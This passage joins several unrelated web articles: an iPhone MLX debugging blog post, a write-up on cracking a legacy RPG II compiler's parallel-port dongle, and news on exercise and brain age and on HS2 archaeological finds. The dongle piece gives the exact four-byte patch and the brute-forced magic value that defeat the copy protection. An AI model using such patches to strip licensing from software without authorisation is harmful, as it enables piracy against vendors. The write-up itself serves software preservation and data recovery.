Clang generates properly inlined assembly.&lt;/p&gt;
  &lt;/main&gt;

    &lt;head rend="h1"&gt;TL;DR:&lt;/head&gt;
    &lt;p&gt;My iPhone 16 Pro Max produces garbage output when running MLX LLMs. An iPhone 15 Pro runs the same code perfectly. A MacBook Pro also runs the same code perfectly. The tensor outputs on the 16 show numerical values an order of magnitude wrong. I suspect it points to a hardware defect in the Neural Engine or some other ML-needed system.&lt;/p&gt;
    &lt;p&gt;It was a PITA to debug, but at least I got a blog post out of it.&lt;/p&gt;
    &lt;head rend="h1"&gt;How did I get there?&lt;/head&gt;
    &lt;p&gt;This was supposed to be a simple, unwinding-time project.&lt;/p&gt;
    &lt;p&gt;For the past few months I've been working on a &lt;del&gt;Clawdbot&lt;/del&gt; Moltbot clone that I've been calling Schmidt. It basically does the same kind of thing but with a custom chat UI instead of using Telegram, WhatsApp or other "I-can't-afford-to-be-banned-from" Service. This project has been consuming early days and late nights, so, to unwind, I decided that it may be a good idea to do something simpler. Since I recently subscribed to MiniMax M2.1, I thought I would do what many do and build a simple expense tracking app to test out the model.&lt;/p&gt;
    &lt;p&gt;The core functionality is simple:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Automatically, upon each payment, add the expense to my app&lt;/item&gt;
      &lt;item&gt;Update an Apple Watch complication with the % of my monthly budget spent&lt;/item&gt;
      &lt;item&gt;Categorize the purchase for later analysis&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This all comes from being basically orphaned by Nubank's amazing native app (since replaced by a less-full-featured Flutter version).&lt;/p&gt;
    &lt;p&gt;Integrating with Shortcuts is manual, but reliable. Within 15 minutes I had a version of the app that could register purchases. The Apple Watch complication, the main goal, can come later. I'd rather get the classification feature, which should be easy, done quickly – so I figured.&lt;/p&gt;
    &lt;head rend="h2"&gt;Apple Intelligence&lt;/head&gt;
    &lt;p&gt;Given the new LLM-bonanza we've been living through, it's no surprise that Apple has their own set of APIs developers such as me can use. Reading up on the documentation, it's a matter of checking for the availability of the feature and then asking the model to either reply to a textual query or, in my case, categorize a request.&lt;/p&gt;
    &lt;p&gt;MiniMax raced through it in a single prompt and then I ran it on my iPhone. First expense was a purchase at a shop called "Kasai Kitchin", classified as... &lt;code&gt;unknown&lt;/code&gt;.&lt;lb/&gt;Weird.&lt;/p&gt;
    &lt;p&gt;Checking the logs, it was clear: the model support was downloading. The feature hadn't been enabled. Again, weird. I should have it on. Anyway, I go into settings, do the weird dance of toggling it on and off – sadly, that's not surprising on Apple's services. Maybe my Settings.app got stuck in a weird state, who knows? – and wait for it to download.&lt;/p&gt;
    &lt;p&gt;After 4h I realized it was not going anywhere. Looking it up, it seems that many have the same issue (this thread shows 12 pages of frustrated users). Again, not a surprise for Apple's services recently.&lt;/p&gt;
    &lt;p&gt;Oh well, time to give up on the Apple Intelligence approach. Let's move on to the next one.&lt;/p&gt;
    &lt;head rend="h2"&gt;MLX LLM&lt;/head&gt;
    &lt;p&gt;Well, the iOS framework engineers don't seem to be the only engineers at Apple capable of coming up with Machine Learning APIs in Swift. Apparently, there's a whole separate way of doing it – with models downloaded to your app. Not great for the user's storage, but great for me!&lt;/p&gt;
    &lt;p&gt;Again, MiniMax does it in a heartbeat, specially after being given documentation and one or two Medium posts. Time to run on my iPhone and... gibberish.&lt;/p&gt;
    &lt;p&gt;The CPU spins to 100% and the model starts generating. But it's all gibberish. And no "stop" token is generated, so this goes on for long.&lt;/p&gt;
    &lt;p&gt;At this point, the only explanation is: I'm completely incompetent and can't even get a simple "ready made" framework to execute what I want. Or, rather, MiniMax is! The good thing about offloading your work to an LLM is that you can blame it for your shortcomings. Time to get my hands dirty and do it myself, typing code on my keyboard, like the ancient Mayan and Aztec programmers probably did.&lt;/p&gt;
    &lt;head rend="h2"&gt;My own MLX implementation&lt;/head&gt;
    &lt;p&gt;I went back to the documentation, to the Medium posts and, much to my surprise: MiniMax had followed it to the letter. Even went back to some deprecated methods of generation and it also was gibberish. And now there's no one to blame, but myself. I go to work everyday and this impostor-syndrome inducing problem silently consumes me. &lt;lb/&gt;After 3 days of trying to get it to work, I'm ready to give up...&lt;lb/&gt;...until, on a Tuesday morning, at 7-8 AM, I have an idea: let me, just in case, run this on my old iPhone 15 Pro. Up to this point, I was running it on my daily driver, an iPhone 16 Pro Max that was a replacement phone sent by Apple Care after a small clubbing mishap (in which my iPhone was irreparably crashed). I rush to get everything ready before it's time to go to work and: it works! Gemma, Qwen, and all other models generate coherent responses!&lt;/p&gt;
    &lt;p&gt;I stop and think: this cannot be a hardware issue, right? Of course not. The iPhone 15 is still running iOS 18. The iPhone 16 is running 26. It must be an OS issue. Well, time to be late for my work standup and update the old phone. The curiosity is too much. Many minutes later... same results, now on iOS 26. The plot is thickening.&lt;/p&gt;
    &lt;head rend="h1"&gt;Finding the smoking gun: breakpoints in MLX's implementations of Gemma&lt;/head&gt;
    &lt;p&gt;After that work day, and after many lunch and coffee discussions with coworkers about the sources of my troubles, I get home and immediately set myself on debugging MLX as it runs, if possible. The game plan is:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Use a known-to-be-reliable model, that fits in RAM (I went with quantized Gemma)&lt;/item&gt;
      &lt;item&gt;Use a simple prompt, in my case "What is 2+2?"&lt;list rend="ul"&gt;&lt;item&gt;To be really pedantic: the prompt was &lt;code&gt;&amp;lt;start_of_turn&amp;gt;user\nWhat is 2+2?&amp;lt;end_of_turn&amp;gt;\n&amp;lt;start_of_turn&amp;gt;model&lt;/code&gt;&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;To be really pedantic: the prompt was &lt;/item&gt;
      &lt;item&gt;Run everything with temperature set to &lt;code&gt;0.0&lt;/code&gt;– maybe that's enough to remove variability&lt;/item&gt;
      &lt;item&gt;Find the model implementation&lt;/item&gt;
      &lt;item&gt;Find where the model iterates through the layers and&lt;/item&gt;
      &lt;item&gt;Print out the MLXArray/Tensor with the values on each layer as the input goes through&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;A few moments later and I find where I need to be. Added the breakpoints, added the logs and off to the races.&lt;/p&gt;
    &lt;p&gt;I run it on my iPhone 16 Pro Max. The model loads and the prompt is "What is 2+2?". The tensors start printing out, line after line after line. For once, the logs aren't complete gibberish – they're numbers. Floating point values representing the model's internal state as it processes the input. I save the output to a file and do the same on my iPhone 15 Pro. Same model, same prompt, same code. Time to compare.&lt;/p&gt;
    &lt;head rend="h1"&gt;Welp, now it's definitely out of my expertise&lt;/head&gt;
    &lt;p&gt;I grep for a pattern I know should be consistent – an array at log-line 58, right before the values get normalized/softmaxed. On a working device, I hypothesize this should be the same every time.&lt;lb/&gt;On the iPhone 15 Pro:&lt;code&gt;3: "[[[[53.875, 62.5625, -187.75, ..., 42.625, 6.25, -21.5625]]]]"&lt;/code&gt;&lt;lb/&gt;On the iPhone 16 Pro Max:&lt;code&gt;3: "[[[[191.5, 23.625, 173.75, ..., 1298, -147.25, -162.5]]]]"&lt;/code&gt;&lt;lb/&gt;Huh. Not close. Not at all. These values are orders of magnitude off. I double check the start of the logs and both phones show the same:&lt;code&gt;1: "array([[[0.162842, -0.162842, -0.48877, ..., -0.176636, 0.0001297, 0.088501],\n [-0.348633, -2.78906, 0, ..., 0.84668, 0, -1.69336],\n [-1.30957, 1.57324, -1.30957, ..., -0.0010376, -0.0010376, 1.12305],\n ...,\n [-0.348633, -2.78906, 0, ..., 0.84668, 0, -1.69336],\n [0.296875, 0.59375, 0.890625, ..., -0.59375, 0.296875, -0.890137],\n [1.02734, -0.616211, -0.616211, ..., -0.275879, -0.551758, 0.275879]]], dtype=float16)"&lt;/code&gt;&lt;/p&gt;
    &lt;p&gt;OK, so the model receives the same thing as input, but at some point, the values start to go off. Like, way off. In order to make sure I'm not crazy, I do one last thing: run the same thing on my Mac. Make the app run on iPad compatibility mode and...&lt;code&gt;3: "[[[[53.875, 62.5625, -187.75, ..., 42.625, 6.25, -21.5625]]]]"&lt;/code&gt;&lt;/p&gt;
    &lt;p&gt;Bingo! Same as iPhone 15!&lt;/p&gt;
    &lt;p&gt;The model isn't broken. The code isn't broken. Most importantly, I'm not broken*. My phone is broken.&lt;lb/&gt;*arguable, but besides the point here&lt;/p&gt;
    &lt;head rend="h1"&gt;What's going on?&lt;/head&gt;
    &lt;p&gt;Let me explain what I think it's going on here: the iPhone 16 Pro Max contains Apple's A18 chip with its Neural Engine—a specialized accelerator for machine learning operations. MLX uses Metal to compile tensor operations for this accelerator. Somewhere in that stack, the computations are going very wrong. I don't think it's a widespread issue but, I do get disappointed that a relatively newly replaced iPhone from Apple Care came with such an issue.&lt;/p&gt;
    &lt;p&gt;However, if my Apple Intelligence troubles are related – and they might as well be, I'd assume that code and MLX are not dissimilar in operations being done –, it could be that all the 12 pages of users are users in a similar dillema, but without the means of debugging it.&lt;/p&gt;
    &lt;head rend="h2"&gt;What now?&lt;/head&gt;
    &lt;p&gt;I spent 3 days thinking I was incompetent. I blamed MiniMax. I blamed myself. The entire time, my $1,400 phone had a broken hardware. I could lose more time figuring out exactly what is wrong with it but it’s literally not worth my time.&lt;/p&gt;
    &lt;p&gt;I guess I can at least take a lesson that, when debugging, I should always consider the physical layer. I spent three days assuming this was a software problem – my code, the library, the framework, my skills as a developer. The breakthrough was basically: "What if I'm not dumb and it's not my code?"&lt;/p&gt;
    &lt;p&gt;As for my phone: it'll probably go back to Apple, as a trade in for a new iPhone 17 Pro Max that hopefully 🤞 can do math.&lt;/p&gt;
    &lt;head rend="h3"&gt;Update on Feb. 1st:&lt;/head&gt;
    &lt;p&gt;Well, now it's Feb. 1st and I have an iPhone 17 Pro Max to test with and... everything works as expected. So it's pretty safe to say that THAT specific instance of iPhone 16 Pro Max was hardware-defective.&lt;/p&gt;
  &lt;/main&gt;

  &lt;main&gt;
    &lt;p&gt;That’s right — this little device is what stood between me and the ability to run an even older piece of software that I recently unearthed during an expedition of software archaeology.&lt;/p&gt;
    &lt;p&gt;For a bit more background, I was recently involved in helping a friend’s accounting firm to move away from using an extremely legacy software package that they had locked themselves into using for the last four decades.&lt;/p&gt;
    &lt;p&gt;This software was built using a programming language called RPG (“Report Program Generator”), which is older than COBOL (!), and was used with IBM’s midrange computers such as the System/3, System/32, and all the way up to the AS/400. Apparently, RPG was subsequently ported to MS-DOS, so that the same software tools built with RPG could run on personal computers, which is how we ended up here.&lt;/p&gt;
    &lt;p&gt;This accounting firm was actually using a Windows 98 computer (yep, in 2026), and running the RPG software inside a DOS console window. And it turned out that, in order to run this software, it requires a special hardware copy-protection dongle to be attached to the computer’s parallel port! This was a relatively common practice in those days, particularly with “enterprise” software vendors who wanted to protect their very important™ software from unauthorized use.&lt;/p&gt;
    &lt;p&gt;Sadly, most of the text and markings on the dongle’s label has been worn or scratched off, but we can make out several clues:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;The words “Stamford, CT”, and what’s very likely the logo of a company called “Software Security Inc”. The only evidence for the existence of this company is this record of them exhibiting their wares at SIGGRAPH conferences in the early 1990s, as well as several patents issued to them, relating to software protection.&lt;/item&gt;
      &lt;item&gt;A word that seems to say “RUNTIME”, which will become clear in a bit.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;My first course of action was to take a disk image of the Windows 98 PC that was running this software, and get it running in an emulator, so that we could see what the software actually does, and perhaps export the data from this software into a more modern format, to be used with modern accounting tools. But of course all of this requires the hardware dongle; none of the accounting tools seem to work without it plugged in.&lt;/p&gt;
    &lt;p&gt;Before doing anything, I looked through the disk image for any additional interesting clues, and found plenty of fascinating (and archaeologically significant?) stuff:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;We’ve got a compiler for the RPG II language (excellent!), made by a company called Software West Inc.&lt;/item&gt;
      &lt;item&gt;Even better, there are two versions of the RPG II compiler, released on various dates in the 1990s by Software West.&lt;/item&gt;
      &lt;item&gt;We’ve got the complete source code of the accounting software, written in RPG. It looks like the full accounting package consists of numerous RPG modules, with a gnarly combination of DOS batch files for orchestrating them, all set up as a “menu” system for the user to navigate using number combinations. Clearly the author of this accounting system was originally an IBM mainframe programmer, and insisted on bringing those skills over to DOS, with mixed results.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I began by playing around with the RPG compiler in isolation, and I learned very quickly that it’s the RPG compiler itself that requires the hardware dongle, and then the compiler automatically injects the same copy-protection logic into any executables it generates. This explains the text that seems to say “RUNTIME” on the dongle.&lt;/p&gt;
    &lt;p&gt;The compiler consists of a few executable files, notably &lt;code&gt;RPGC.EXE&lt;/code&gt;, which is the compiler, and &lt;code&gt;SEU.EXE&lt;/code&gt;, which is a source editor (“Source Entry Utility”). Here’s what we get when we launch SEU without the dongle, after a couple of seconds:&lt;/p&gt;
    &lt;p&gt;A bit rude, but this gives us an important clue: this program must be trying to communicate over the parallel port over the course of a few seconds (which could give us an opportunity to pause it for debugging, and see what it’s doing during that time), and then exits with a message (which we can now find in a disassembly of the program, and trace how it gets there).&lt;/p&gt;
    &lt;p&gt;A great tool for disassembling executables of this vintage is Reko. It understands 16-bit real mode executables, and even attempts to decompile them into readable C code that corresponds to the disassembly.&lt;/p&gt;
    &lt;p&gt;And so, looking at the decompiled/disassembled code in Reko, I expected to find &lt;code&gt;in&lt;/code&gt; and &lt;code&gt;out&lt;/code&gt; instructions, which would be the telltale sign of the program trying to communicate with the parallel port through the PC’s I/O ports. However… I didn’t see an &lt;code&gt;in&lt;/code&gt; or &lt;code&gt;out&lt;/code&gt; instruction anywhere! But then I noticed something: Reko disassembled the executable into two “segments”: &lt;code&gt;0800&lt;/code&gt; and &lt;code&gt;0809&lt;/code&gt;, and I was only looking at segment &lt;code&gt;0809&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;If we look at segment &lt;code&gt;0800&lt;/code&gt;, we see the smoking gun: &lt;code&gt;in&lt;/code&gt; and &lt;code&gt;out&lt;/code&gt; instructions, meaning that the copy-protection routine is definitely here, and best of all, the entire code segment is a mere 0x90 bytes, which suggests that the entire routine should be pretty easy to unravel and understand. For some reason, Reko was not able to decompile this code into a C representation, but it still produced a disassembly, which will work just fine for our purposes. Maybe this was a primitive form of obfuscation from those early days, which is now confusing Reko and preventing it from associating this chunk of code with the rest of the program… who knows.&lt;/p&gt;
    &lt;p&gt;Here is a GitHub Gist with the disassembly of this code, along with my annotations and notes. My x86 assembly knowledge is a little rusty, but here is the gist of what this code does:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;It’s definitely a single self-contained routine, intended to be called using a “far” &lt;code&gt;CALL&lt;/code&gt;instruction, since it returns with a&lt;code&gt;RETF&lt;/code&gt;instruction.&lt;/item&gt;
      &lt;item&gt;It begins by detecting the address of the parallel port, by reading the BIOS data area. If the computer has more than one parallel port, the dongle must be connected to the first parallel port (LPT1).&lt;/item&gt;
      &lt;item&gt;It performs a loop where it writes values to the data register of the parallel port, and then reads the status register, and accumulates responses in the &lt;code&gt;BH&lt;/code&gt;and&lt;code&gt;BL&lt;/code&gt;registers.&lt;/item&gt;
      &lt;item&gt;At the end of the routine, the “result” of the whole procedure is stored in the &lt;code&gt;BX&lt;/code&gt;register (&lt;code&gt;BH&lt;/code&gt;and&lt;code&gt;BL&lt;/code&gt;together), which will presumably be “verified” by the caller of the routine.&lt;/item&gt;
      &lt;item&gt;Very importantly, there doesn’t seem to be any “input” into this routine. It doesn’t pop anything from the stack, nor does it care about any register values passed into it. Which can only mean that the result of this routine is completely constant! No matter what complicated back-and-forth it does with the dongle, the result of this routine should always be the same.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;With the knowledge that this routine must exit with some magic value stored in &lt;code&gt;BX&lt;/code&gt;, we can now patch the first few bytes of the routine to do just that! Not yet knowing which value to put in &lt;code&gt;BX&lt;/code&gt;, let’s start with 1234:&lt;/p&gt;
    &lt;code&gt;BB 34 12       MOV BX, 1234h
CB             RETF
&lt;/code&gt;
    &lt;p&gt;Only the first four bytes need patching — set &lt;code&gt;BX&lt;/code&gt; to our desired value, and get out of there (&lt;code&gt;RETF&lt;/code&gt;). Running the patched executable with these new bytes still fails (expectedly) with the same message of “No dongle, no edit”, but it fails immediately, instead of after several seconds of talking to the parallel port. Progress!&lt;/p&gt;
    &lt;p&gt;Stepping through the disassembly more closely, we get another major clue: The only value that &lt;code&gt;BH&lt;/code&gt; can be at the end of the routine is 76h (this is hard-coded into the routine). So, our total value for the magic number in &lt;code&gt;BX&lt;/code&gt; must be of the form 76xx. In other words, only the &lt;code&gt;BL&lt;/code&gt; value remains unknown:&lt;/p&gt;
    &lt;code&gt;BB __ 76       MOV BX, 76__h
CB             RETF
&lt;/code&gt;
    &lt;p&gt;Since &lt;code&gt;BL&lt;/code&gt; is an 8-bit register, it can only have 256 possible values. And what do we do when we have 256 combinations to try? Brute force it! I whipped up a script that plugs a value into that particular byte (from 0 to 255) and programmatically launches the executable in DosBox, and observes the output. Lo and behold, it worked! The brute forcing didn’t take long at all, because the correct number turned out to be… 6. Meaning that the total magic number in &lt;code&gt;BX&lt;/code&gt; should be 7606h:&lt;/p&gt;
    &lt;code&gt;BB 06 76       MOV BX, 7606h
CB             RETF
&lt;/code&gt;
    &lt;p&gt;Bingo!&lt;lb/&gt; And then, proceeding to examine the other executable files in the compiler suite, the parallel port routine turns out to be exactly the same. All of the executables have the exact same copy protection logic, as if it was rubber-stamped onto them. In fact, when the compiler (&lt;code&gt;RPGC.EXE&lt;/code&gt;) compiles some RPG source code, it seems to copy the parallel port routine from itself into the compiled program. That’s right: the patched version of the compiler will produce executables with the same patched copy protection routine! Very convenient.&lt;/p&gt;
    &lt;p&gt;I must say, this copy protection mechanism seems a bit… simplistic? A hardware dongle that just passes back a constant number? Defeatable with a four-byte patch? Is this really worthy of a patent? But who am I to pass judgment. It’s possible that I haven’t fully understood the logic, and the copy protection will somehow re-surface in another way. It’s also possible that the creators of the RPG compiler (Software West, Inc) didn’t take proper advantage of the hardware dongle, and used it in a way that is so easily bypassed.&lt;/p&gt;
    &lt;p&gt;In any case, Software West’s RPG II compiler is now free from the constraint of the parallel port dongle! And at some point soon, I’ll work on purging any PII from the compiler directories, and make this compiler available as an artifact of computing history. It doesn’t seem to be available anywhere else on the web. If anyone reading this was associated with Software West Inc, feel free to get in touch — I have many questions!&lt;/p&gt;

    &lt;head rend="h1"&gt;MRI scans show exercise can make the brain look younger&lt;/head&gt;
    &lt;head rend="h2"&gt;Just 150 minutes of weekly aerobic exercise may help keep your brain younger, and your mind sharper, well into the future.&lt;/head&gt;
    &lt;list rend="dl"&gt;

      &lt;item rend="dd-1"&gt;January 22, 2026&lt;/item&gt;

      &lt;item rend="dd-2"&gt;Journal of Sport and Health Science&lt;/item&gt;
      &lt;item rend="dt-3"&gt;Summary:&lt;/item&gt;
      &lt;item rend="dd-3"&gt;New research suggests that consistent aerobic exercise can help keep your brain biologically younger. Adults who exercised regularly for a year showed brains that appeared nearly a year younger than those who didnât change their habits. The study focused on midlife, a critical window when prevention may offer long-term benefits. Even small shifts in brain age could add up over decades.&lt;/item&gt;
      &lt;item rend="dt-4"&gt;Share:&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Looking after your brain is something that happens over many years, and new findings from the AdventHealth Research Institute point to an encouraging option. Researchers report that sticking with a consistent aerobic exercise routine may help the brain remain biologically younger. This effect could support clearer thinking, better memory, and overall mental well-being.&lt;/p&gt;
    &lt;p&gt;The research showed that adults who committed to a full year of aerobic exercise had brains that appeared almost one year younger than those of participants who did not change how active they were.&lt;/p&gt;
    &lt;p&gt;Measuring Brain Age With MRI&lt;/p&gt;
    &lt;p&gt;Published in the Journal of Sport and Health Science, the study examined whether regular aerobic exercise could slow or even reverse what scientists call "brain age." Brain age is estimated using magnetic resonance imaging (MRI) and reflects how old the brain appears compared to a person's actual age. A higher brain-predicted age difference (brain-PAD) means the brain looks older, and earlier studies have linked this measure to weaker physical and cognitive performance and a higher risk of death.&lt;/p&gt;
    &lt;p&gt;"We found that a simple, guideline-based exercise program can make the brain look measurably younger over just 12 months," said Dr. Lu Wan, lead author and data scientist at the AdventHealth Research Institute. "Many people worry about how to protect their brain health as they age. Studies like this offer hopeful guidance grounded in everyday habits. These absolute changes were modest, but even a one-year shift in brain age could matter over the course of decades."&lt;/p&gt;
    &lt;p&gt;Inside the Year-Long Exercise Trial&lt;/p&gt;
    &lt;p&gt;The clinical trial included 130 healthy adults between the ages of 26 and 58. Participants were randomly assigned to either a moderate-to-vigorous aerobic exercise group or a usual-care control group. Those in the exercise group completed two supervised 60-minute workout sessions each week in a laboratory and added home-based exercise to reach roughly 150 minutes of aerobic activity per week. This schedule matched the physical activity guidelines set by the American College of Sports Medicine.&lt;/p&gt;
    &lt;p&gt;Researchers measured brain structure using MRI scans and assessed cardiorespiratory fitness through peak oxygen uptake (VO2peak) at the start of the study and again after 12 months.&lt;/p&gt;
    &lt;p&gt;Exercise Linked to a Younger Looking Brain&lt;/p&gt;
    &lt;p&gt;After one year, clear differences emerged between the two groups. Participants who exercised showed a measurable decrease in brain age, while those in the control group showed a slight increase. On average, the exercise group saw their brain-PAD drop by about 0.6 years, meaning their brains looked younger at the end of the study. The control group's brains appeared about 0.35 years older, a change that was not statistically significant. When compared directly, the gap between the two groups was close to one full year in favor of the exercise group.&lt;/p&gt;
    &lt;p&gt;"Even though the difference is less than a year, prior studies suggest that each additional 'year' of brain age is associated with meaningful differences in later-life health," said Dr. Kirk I. Erickson, senior author of the study and a neuroscientist and director at AdventHealth Research Institute and the University of Pittsburgh. "From a lifespan perspective, nudging the brain in a younger direction in midlife could be very important."&lt;/p&gt;
    &lt;p&gt;Why Exercise May Affect Brain Aging&lt;/p&gt;
    &lt;p&gt;To better understand why exercise influenced brain age, the research team looked at several possible factors. These included changes in physical fitness, body composition, blood pressure, and levels of brain-derived neurotrophic factor (BDNF), a protein that supports brain plasticity. Although fitness levels clearly improved with exercise, none of these factors statistically explained the reduction in brain-PAD seen in the trial.&lt;/p&gt;
    &lt;p&gt;"That was a surprise," Wan noted. "We expected improvements in fitness or blood pressure to account for the effect, but they didn't. Exercise may be acting through additional mechanisms we haven't captured yet, such as subtle changes in brain structure, inflammation, vascular health or other molecular factors."&lt;/p&gt;
    &lt;p&gt;Focusing on Midlife for Long-Term Benefits&lt;/p&gt;
    &lt;p&gt;Many studies on exercise and brain health focus on older adults, after age-related changes have already become more pronounced. This trial took a different approach by targeting people in early to mid-adulthood, when brain changes are harder to detect but prevention may offer greater benefits over time.&lt;/p&gt;
    &lt;p&gt;"Intervening in the 30s, 40s and 50s gives us a head start," Erickson said. "If we can slow brain aging before major problems appear, we may be able to delay or reduce the risk of later-life cognitive decline and dementia."&lt;/p&gt;
    &lt;p&gt;What the Findings Mean Going Forward&lt;/p&gt;
    &lt;p&gt;The authors caution that the study involved healthy, relatively well-educated volunteers and that the changes in brain age were modest. They note that larger studies and longer follow-up periods are needed to learn whether these reductions in brain-PAD lead to lower risks of stroke, dementia, or other brain-related diseases.&lt;/p&gt;
    &lt;p&gt;"People often ask, 'Is there anything I can do now to protect my brain later?'" Erickson said. "Our findings support the idea that following current exercise guidelines -- 150 minutes per week of moderate-to-vigorous aerobic activity -- may help keep the brain biologically younger, even in midlife."&lt;/p&gt;

    &lt;head rend="h1"&gt;Treasures found on HS2 route stored in secret warehouse&lt;/head&gt;
    &lt;p&gt;Treasures unearthed by hundreds of archaeologists during the ongoing construction of the controversial HS2 train line have been shown exclusively to the BBC.&lt;/p&gt;
    &lt;p&gt;The 450,000 objects, which are being held in a secret warehouse, include a possible Roman gladiator's tag, a hand axe that may be more than 40,000 years old and 19th Century gold dentures.&lt;/p&gt;
    &lt;p&gt;It is an "unprecedented" amount and array of items, which will yield new insights into Britain's past, says the Centre for British Archaeology.&lt;/p&gt;
    &lt;p&gt;Major building developments in the UK need land to be assessed by archaeologists as part of the planning process, to protect heritage sites.&lt;/p&gt;
    &lt;p&gt;Since 2018 around 1,000 archaeologists have been involved in 60 digs along the route HS2 is set to take between London to Birmingham.&lt;/p&gt;
    &lt;p&gt;While the route is not currently scheduled to open until after 2033 due to delays, archaeologists say their fieldwork is largely complete.&lt;/p&gt;
    &lt;p&gt;The warehouse's location is a closely guarded secret for security purposes. All we can say is that it is in Yorkshire. Inside are shelves and shelves of pallets, loaded with around 7,300 boxes of historic items destined for further research.&lt;/p&gt;
    &lt;p&gt;The future of many objects, including whether they will stay in storage or be displayed, is still undecided, along with their ownership.&lt;/p&gt;
    &lt;p&gt;Historic England commended the team for revealing "new and exciting sites spanning over 10,000 years of our past".&lt;/p&gt;
    &lt;p&gt;But building HS2 has changed the landscape along its route, cutting into fields and communities, and dividing opinion.&lt;/p&gt;
    &lt;p&gt;Critics, such as Greg Smith, MP for Mid Buckinghamshire, say soaring costs, delays, abandoned villages and damage to the natural and historic environment mean that it is not worth building.&lt;/p&gt;
    &lt;p&gt;"It should not have cost the taxpayer tens of billions of pounds to build a railway that no-one wants and brings so much destruction," Smith says.&lt;/p&gt;
    &lt;p&gt;HS2 said in response: "Chief Executive Mark Wild has been clear that overall delivery of HS2 has been unacceptable and he's committed to ending the project's cycle of cost increases and delays."&lt;/p&gt;
    &lt;p&gt;"Our specialist archaeology team and contractors have carefully excavated numerous sites and have shown care and respect throughout this work."&lt;/p&gt;
    &lt;p&gt;"Whether HS2 is a good or bad thing is debatable, but I tell you what, if they built the railway and they didn't do the archaeology that would be more tragic," said historian Graham Evans, who chairs the Northamptonshire Battlefields Society.&lt;/p&gt;
    &lt;p&gt;The store holds showstoppers such as Roman statue heads and a gold 'three lions' pendant from the 13th-14th Century.&lt;/p&gt;
    &lt;p&gt;On the ground in one area is a bubble-wrapped empty coffin dating to 1799, with a smaller one next to it wrapped in masking tape - sobering reminders that this store is a snapshot of real lives once lived.&lt;/p&gt;
    &lt;p&gt;Some of the objects discovered have already been shown to the public.&lt;/p&gt;
    &lt;p&gt;We have picked out six that have never been on display. You can see where they were found on the HS2 route map below - then scroll further down to see the objects and read about their history.&lt;/p&gt;
    &lt;head rend="h2"&gt;Palaeolithic hand axe&lt;/head&gt;
    &lt;p&gt;Experts think this is more than 40,000 years old and was made by Neanderthals or an earlier species of human.&lt;/p&gt;
    &lt;p&gt;Found in the Edgcote area in Northamptonshire, it has a sharp edge likely designed for butchering animals.&lt;/p&gt;
    &lt;p&gt;Hand axes were held in the palm rather than attached to a wooden handle.&lt;/p&gt;
    &lt;p&gt;"There is something tactile about it when you hold it," said Dr Sara Machin, the finds lead for Access +, the consortium of archaeologists in charge of this project. "Even now it fits snugly in my hand."&lt;/p&gt;
    &lt;head rend="h2"&gt;Roman gladiator tag&lt;/head&gt;
    &lt;p&gt;The small piece of carved thin bone bears an inscription. Experts would expect it to read if complete: "DOMINE VICTOR VINCAS FELIX" or "Lord Victor, may you win and be lucky."&lt;/p&gt;
    &lt;p&gt;Discovered in Northamptonshire, Machin says it could have belonged to an active or former Roman gladiator, or even be a spectator's souvenir, even though there is no evidence of an arena or circus space in that part of the country.&lt;/p&gt;
    &lt;p&gt;It was recovered from a large pottery vessel containing cremated human remains, with an X on the lid.&lt;/p&gt;
    &lt;p&gt;Dr John Pearce Reader in Archaeology at Kings College University said that a link to a gladiator was possible, but added that "with more forensic analysis of the burial, a different story may come to light".&lt;/p&gt;
    &lt;head rend="h2"&gt;Anglo-Saxon spindle whorl&lt;/head&gt;
    &lt;p&gt;Thought to be made from a cattle femur, this decorated Anglo-Saxon spindle whorl, used to provide weight while spinning yarn, was unearthed from farmland near Bishopstone, Buckinghamshire.&lt;/p&gt;
    &lt;p&gt;"It's a very interesting piece of evidence of textile advancements in the Anglo-Saxon period," said Willow Major, a post-excavation assistant.&lt;/p&gt;
    &lt;p&gt;Its polished surface leads her to believe it got a lot of use and was very dear to someone, she said, adding that interestingly, the ring and dot motif had been found on spinning tools from the much earlier Iron age.&lt;/p&gt;
    &lt;head rend="h2"&gt;Medieval die&lt;/head&gt;
    &lt;p&gt;A tiny polished die recovered from a deserted medieval village in Lower Radbourne, Warwickshire, resembles modern ones, but with a different numbering format.&lt;/p&gt;
    &lt;p&gt;Its imperfections, with one side longer than the others, stand it in contrast with today's mass-produced dice.&lt;/p&gt;
    &lt;head rend="h2"&gt;Pug found in a grave&lt;/head&gt;
    &lt;p&gt;This complete figurine of a seated pug dog in plain white-glazed porcelain with black details was found in the grave of an unnamed female at St James' Gardens in Euston.&lt;/p&gt;
    &lt;p&gt;It is thought to have been made in the Derby porcelain factory around 1770-1800.&lt;/p&gt;
    &lt;head rend="h2"&gt;19th Century gold dentures&lt;/head&gt;
    &lt;p&gt;"Every box has a surprise," Machin said as she unwrapped perhaps the most bizarre item here, thought to be from the 19th Century: a set of lower gold dentures found at St Mary's Old Church in Stoke Mandeville.&lt;/p&gt;
    &lt;p&gt;It contains six teeth and has a number stamped on the inside.&lt;/p&gt;
    &lt;p&gt;"These are objects, but they all relate to people," Machin said. "It's all about the people who lived in these areas going back thousands of years and we can start writing the stories about their lives and what they can tell us."&lt;/p&gt;
    &lt;head rend="h2"&gt;'Extraordinary' scale&lt;/head&gt;
    &lt;p&gt;"The scale is what makes it so extraordinary," Neil Redfern from the Council for British Archaeology says comparing HS2 to other big development projects.&lt;/p&gt;
    &lt;p&gt;"But it is the length of the scheme and the landscapes and places that HS2 passed through that make the collection of sites and material so interesting. The research potential from this material is remarkable."&lt;/p&gt;
    &lt;p&gt;He believes that the finds could help people understand wider landscape change now and in the past.&lt;/p&gt;
    &lt;p&gt;To dig deeper into these stories, archaeologists are now entering the second phase of works, including further condition, cleaning and conservation checks.&lt;/p&gt;
